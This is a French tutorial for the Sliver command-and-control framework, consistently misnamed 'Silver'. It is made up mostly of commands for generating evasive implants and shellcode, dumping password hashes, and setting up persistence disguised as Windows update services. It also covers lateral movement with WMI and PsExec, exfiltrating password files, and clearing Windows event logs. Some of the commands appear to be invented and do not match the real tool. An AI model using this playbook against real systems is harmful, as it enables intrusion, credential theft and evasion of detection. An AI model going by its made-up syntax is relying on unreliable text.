# Guide Complet - Silver C2 Framework sur Kali Linux

## Table des Matières
1. [Introduction à Silver C2](#introduction)
2. [Prérequis et Installation](#installation)
3. [Configuration Initiale](#configuration)
4. [Génération d'Implants](#implants)
5. [Techniques Post-Exploitation](#post-exploitation)
6. [Exemples Pratiques](#exemples)
7. [Sécurité et Éthique](#securite)
8. [Dépannage](#depannage)

## 1. Introduction à Silver C2 {#introduction}

Silver est un framework de Command & Control (C2) moderne développé en Go, conçu pour les tests d'intrusion et les exercices Red Team. Il offre une alternative moderne aux frameworks traditionnels comme Cobalt Strike ou Metasploit.

### Avantages de Silver :
- **Cross-platform** : Implants pour Windows, Linux, macOS
- **Cryptographie robuste** : Chiffrement bout en bout
- **Interface moderne** : Console interactive et interface web
- **Extensible** : Support d'extensions et scripts personnalisés
- **Gratuit et Open Source**

## 2. Prérequis et Installation {#installation}

### Prérequis
```bash
# Mise à jour du système Kali
sudo apt update && sudo apt upgrade -y

# Installation des dépendances
sudo apt install -y curl wget git build-essential
```

### Installation de Go (si nécessaire)
```bash
# Vérifier la version de Go
go version

# Si Go n'est pas installé ou version < 1.19
wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz

# Ajouter Go au PATH
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
```

### Installation de Silver
```bash
# Méthode 1: Installation via le script officiel
curl https://sliver.sh/install | sudo bash

# Méthode 2: Compilation depuis les sources
git clone https://github.com/BishopFox/sliver.git
cd sliver
make
sudo make install
```

### Vérification de l'installation
```bash
sliver-server version
sliver-client version
```

## 3. Configuration Initiale {#configuration}

### Démarrage du serveur Silver
```bash
# Démarrer le serveur en mode démon
sudo sliver-server daemon

# Ou en mode interactif
sudo sliver-server
```

### Première connexion
```bash
# Se connecter au serveur local
sliver-client

# Ou utiliser l'interface web (optionnel)
# Le serveur expose l'interface web sur https://localhost:8443
```

### Configuration des listeners
```bash
# Dans la console Silver
sliver > listeners

# Créer un listener HTTP
sliver > http --lhost 0.0.0.0 --lport 8080

# Créer un listener HTTPS
sliver > https --lhost 0.0.0.0 --lport 8443 --cert /path/to/cert.pem --key /path/to/key.pem

# Créer un listener DNS
sliver > dns --domains example.com --lhost 0.0.0.0 --lport 53

# Lister les listeners actifs
sliver > listeners
```

## 4. Génération d'Implants {#implants}

### Génération d'un implant Windows
```bash
# Implant Windows basique
sliver > generate --http 192.168.1.100:8080 --os windows --arch amd64 --format exe --save /tmp/

# Implant avec options avancées
sliver > generate beacon --http 192.168.1.100:8080 --os windows --arch amd64 --jitter 30s --interval 60s --format exe --save /tmp/
```

### Génération d'un implant Linux
```bash
# Implant Linux
sliver > generate --http 192.168.1.100:8080 --os linux --arch amd64 --format elf --save /tmp/

# Implant avec obfuscation
sliver > generate --http 192.168.1.100:8080 --os linux --arch amd64 --format elf --evasion --save /tmp/
```

### Génération d'un shellcode
```bash
# Génération de shellcode pour injection
sliver > generate --http 192.168.1.100:8080 --os windows --arch amd64 --format shellcode --save /tmp/
```

### Profils de génération
```bash
# Créer un profil réutilisable
sliver > profiles new --http 192.168.1.100:8080 --os windows --arch amd64 --format exe windows-profile

# Utiliser un profil
sliver > profiles generate windows-profile --save /tmp/

# Lister les profils
sliver > profiles
```

## 5. Techniques Post-Exploitation {#post-exploitation}

### Gestion des sessions
```bash
# Lister les sessions actives
sliver > sessions

# Interagir avec une session
sliver > use <session-id>

# Informations système
sliver (<session>) > info
sliver (<session>) > ps
sliver (<session>) > netstat
```

### Collecte d'informations
```bash
# Informations système
sliver (<session>) > whoami
sliver (<session>) > getuid
sliver (<session>) > pwd
sliver (<session>) > ls

# Informations réseau
sliver (<session>) > ifconfig
sliver (<session>) > netstat
sliver (<session>) > arp

# Processus en cours
sliver (<session>) > ps
sliver (<session>) > ps -T  # Avec threads
```

### Transfert de fichiers
```bash
# Upload d'un fichier
sliver (<session>) > upload /local/path/file.txt /remote/path/

# Download d'un fichier
sliver (<session>) > download /remote/path/file.txt /local/path/

# Upload et exécution
sliver (<session>) > execute /path/to/uploaded/tool.exe
```

### Élévation de privilèges
```bash
# Tentatives d'élévation automatique
sliver (<session>) > getsystem

# Injection de processus
sliver (<session>) > ps  # Trouver un processus cible
sliver (<session>) > migrate <PID>

# Dump des hashes
sliver (<session>) > hashdump
```

### Persistance
```bash
# Création d'un service Windows
sliver (<session>) > persistence service --name "WindowsUpdate" --path "C:\Windows\System32\implant.exe"

# Tâche programmée
sliver (<session>) > persistence task --name "SystemCheck" --path "C:\Windows\System32\implant.exe" --trigger logon

# Registre Windows
sliver (<session>) > persistence registry --key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" --value "Update" --path "C:\Users\user\implant.exe"
```

### Mouvement latéral
```bash
# Scan réseau
sliver (<session>) > portscan 192.168.1.0/24

# Exécution à distance via WMI
sliver (<session>) > wmi --hostname target.domain.com --username admin --password pass123 --payload /path/to/implant.exe

# Exécution via PsExec
sliver (<session>) > psexec --hostname target.domain.com --username admin --password pass123 --payload /path/to/implant.exe
```

## 6. Exemples Pratiques {#exemples}

### Scénario 1: Accès Initial et Reconnaissance
```bash
# 1. Générer l'implant
sliver > generate --http 192.168.1.100:8080 --os windows --arch amd64 --format exe --save /tmp/implant.exe

# 2. Attendre la connexion
sliver > sessions

# 3. Reconnaissance de base
sliver > use <session-id>
sliver (<session>) > info
sliver (<session>) > whoami
sliver (<session>) > ps
sliver (<session>) > netstat
```

### Scénario 2: Exfiltration de données
```bash
# 1. Recherche de fichiers sensibles
sliver (<session>) > ls "C:\Users\"
sliver (<session>) > find "C:\Users\" "*.pdf"
sliver (<session>) > find "C:\Users\" "password*"

# 2. Exfiltration
sliver (<session>) > download "C:\Users\user\Documents\sensitive.pdf" /tmp/
sliver (<session>) > download "C:\Users\user\Desktop\passwords.txt" /tmp/
```

### Scénario 3: Établissement de persistance
```bash
# 1. Copier l'implant dans un répertoire permanent
sliver (<session>) > upload /tmp/implant.exe "C:\Windows\System32\svchost_update.exe"

# 2. Créer une tâche programmée
sliver (<session>) > persistence task --name "SystemUpdate" --path "C:\Windows\System32\svchost_update.exe" --trigger startup

# 3. Vérifier la persistance
sliver (<session>) > execute "schtasks /query /tn SystemUpdate"
```

## 7. Sécurité et Éthique {#securite}

### Considérations légales et éthiques
⚠️ **IMPORTANT** : Silver C2 est un outil puissant qui ne doit être utilisé que dans les contextes suivants :
- Tests d'intrusion autorisés
- Exercices Red Team internes
- Recherche académique
- Environnements de laboratoire

### Bonnes pratiques
```bash
# 1. Chiffrement des communications
# Toujours utiliser HTTPS ou DNS over HTTPS
sliver > https --lhost 0.0.0.0 --lport 443

# 2. Authentification forte
# Configurer l'authentification mutuelle
sliver > operators new --name pentester --lhost 192.168.1.100

# 3. Logs et audit
# Activer les logs détaillés
sliver-server daemon --log-level debug --log-file /var/log/sliver.log
```

### Nettoyage post-test
```bash
# Supprimer les implants
sliver (<session>) > rm "C:\Windows\System32\svchost_update.exe"

# Supprimer la persistance
sliver (<session>) > execute "schtasks /delete /tn SystemUpdate /f"

# Nettoyer les logs (si autorisé)
sliver (<session>) > execute "wevtutil cl Security"
sliver (<session>) > execute "wevtutil cl System"
```

## 8. Dépannage {#depannage}

### Problèmes courants

#### L'implant ne se connecte pas
```bash
# Vérifier les listeners
sliver > listeners

# Vérifier les règles de pare-feu
sudo ufw status
sudo iptables -L

# Tester la connectivité
curl -k https://192.168.1.100:8443
```

#### Problèmes de compilation
```bash
# Vérifier la version de Go
go version

# Nettoyer et recompiler
cd /opt/sliver
make clean
make
```

#### Problèmes de permissions
```bash
# Vérifier les permissions du répertoire
sudo chown -R $USER:$USER ~/.sliver/

# Redémarrer le serveur avec les bonnes permissions
sudo sliver-server daemon
```

### Logs et débogage
```bash
# Activer les logs détaillés
sliver-server daemon --log-level debug

# Consulter les logs
tail -f /var/log/sliver.log

# Logs de session spécifique
sliver > logs --session <session-id>
```

## Ressources supplémentaires

- **Documentation officielle** : https://github.com/BishopFox/sliver/wiki
- **Tutoriels vidéo** : https://www.youtube.com/c/BishopFox
- **Discord communautaire** : https://discord.gg/bishopfox
- **Wiki GitHub** : https://github.com/BishopFox/sliver/wiki

---

**Disclaimer** : Ce guide est fourni à des fins éducatives uniquement. L'utilisation de Silver C2 sur des systèmes sans autorisation explicite est illégale. Assurez-vous toujours d'avoir l'autorisation appropriée avant d'effectuer des tests d'intrusion.